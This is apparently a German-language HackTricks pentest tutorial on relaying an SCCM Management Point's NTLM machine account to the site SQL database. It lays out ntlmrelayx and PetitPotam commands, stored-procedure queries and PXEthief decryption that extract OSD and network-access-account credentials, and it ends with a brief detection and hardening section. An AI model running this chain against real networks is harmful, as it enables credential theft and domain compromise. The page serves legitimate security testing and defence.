# SCCM Management Point NTLM Relay zu SQL – OSD-Policy-Geheimnisextraktion

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Durch das Zwingen eines **System Center Configuration Manager (SCCM) Management Point (MP)** zur Authentifizierung über SMB/RPC und das **Relaying** dieses NTLM-Maschinenkontos zur **Site-Datenbank (MSSQL)** erhalten Sie `smsdbrole_MP` / `smsdbrole_MPUserSvc` Rechte. Diese Rollen ermöglichen es Ihnen, eine Reihe von gespeicherten Prozeduren aufzurufen, die **Operating System Deployment (OSD)** Policy-Blobs (Anmeldeinformationen für Netzwerkzugangskonten, Task-Sequence-Variablen usw.) offenlegen. Die Blobs sind hex-encodiert/verschlüsselt, können jedoch mit **PXEthief** decodiert und entschlüsselt werden, was Klartextgeheimnisse ergibt.

High-Level-Kette:
1. Entdecken Sie MP & Site-DB ↦ nicht authentifizierter HTTP-Endpunkt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Starten Sie `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Zwingen Sie MP mit **PetitPotam**, PrinterBug, DFSCoerce usw.
4. Verbinden Sie sich über den SOCKS-Proxy mit `mssqlclient.py -windows-auth` als das relayed **<DOMAIN>\\<MP-host>$** Konto.
5. Führen Sie aus:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (oder `MP_GetPolicyBodyAfterAuthorization`)
6. Entfernen Sie `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Geheimnisse wie `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` usw. werden wiederhergestellt, ohne PXE oder Clients zu berühren.

---

## 1. Auflisten nicht authentifizierter MP-Endpunkte
Die MP ISAPI-Erweiterung **GetAuth.dll** gibt mehrere Parameter frei, die keine Authentifizierung erfordern (es sei denn, die Site ist nur PKI):

| Parameter | Zweck |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Gibt den öffentlichen Schlüssel des Site-Signaturzertifikats + GUIDs von *x86* / *x64* **All Unknown Computers** Geräten zurück. |
| `MPLIST` | Listet jeden Management-Point in der Site auf. |
| `SITESIGNCERT` | Gibt das Primär-Site-Signaturzertifikat zurück (identifiziert den Site-Server ohne LDAP). |

Holen Sie sich die GUIDs, die als **clientID** für spätere DB-Abfragen dienen werden:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Übertragen Sie das MP-Maschinenkonto an MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wenn die Zwangsmaßnahme ausgelöst wird, sollten Sie etwas sehen wie:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifizieren Sie OSD-Richtlinien über gespeicherte Prozeduren
Verbinden Sie sich über den SOCKS-Proxy (Standardport 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Wechseln Sie zur **CM_<SiteCode>** DB (verwenden Sie den 3-stelligen Standortcode, z.B. `CM_001`).

### 3.1  Unbekannte Computer-GUIDs finden (optional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Zugewiesene Richtlinien auflisten
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Jede Zeile enthält `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus auf Richtlinien:
* **NAAConfig**  – Netzwerkzugangskonto-Credentials
* **TS_Sequence** – Tasksequenzvariablen (OSDJoinAccount/Password)
* **CollectionSettings** – Kann Run-as-Konten enthalten

### 3.3  Vollständigen Body abrufen
Wenn Sie bereits `PolicyID` & `PolicyVersion` haben, können Sie die Anforderung des clientID mit folgendem überspringen:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WICHTIG: Erhöhen Sie in SSMS „Maximale abgerufene Zeichen“ (>65535), da der Blob sonst abgeschnitten wird.

---

## 4. Dekodieren & Entschlüsseln des Blobs
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Wiederhergestellte Geheimnisse Beispiel:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL-Rollen & Verfahren
Beim Relay wird der Login zugeordnet zu:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Diese Rollen bieten Dutzende von EXEC-Berechtigungen, die wichtigsten, die in diesem Angriff verwendet werden, sind:

| Stored Procedure | Zweck |
|------------------|-------|
| `MP_GetMachinePolicyAssignments` | Listet die auf ein `clientID` angewendeten Richtlinien auf. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gibt den vollständigen Richtlinieninhalt zurück. |
| `MP_GetListOfMPsInSiteOSD` | Wird durch den `MPKEYINFORMATIONMEDIA`-Pfad zurückgegeben. |

Sie können die vollständige Liste einsehen mit:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Erkennung & Härtung
1. **Überwachen Sie MP-Anmeldungen** – jedes MP-Computer-Konto, das sich von einer IP anmeldet, die nicht sein Host ist ≈ Relay.
2. Aktivieren Sie **Erweiterte Schutzmaßnahmen für die Authentifizierung (EPA)** in der Standortdatenbank (`PREVENT-14`).
3. Deaktivieren Sie ungenutztes NTLM, erzwingen Sie SMB-Signierung, beschränken Sie RPC (
die gleichen Milderungsmaßnahmen, die gegen `PetitPotam`/`PrinterBug` verwendet werden).
4. Härtung der MP ↔ DB-Kommunikation mit IPSec / mutual-TLS.

---

## Siehe auch
* NTLM-Relay-Grundlagen:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL-Missbrauch & Post-Exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referenzen
- [Ich möchte mit Ihrem Manager sprechen: Geheimnisse mit Management Point Relays stehlen](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
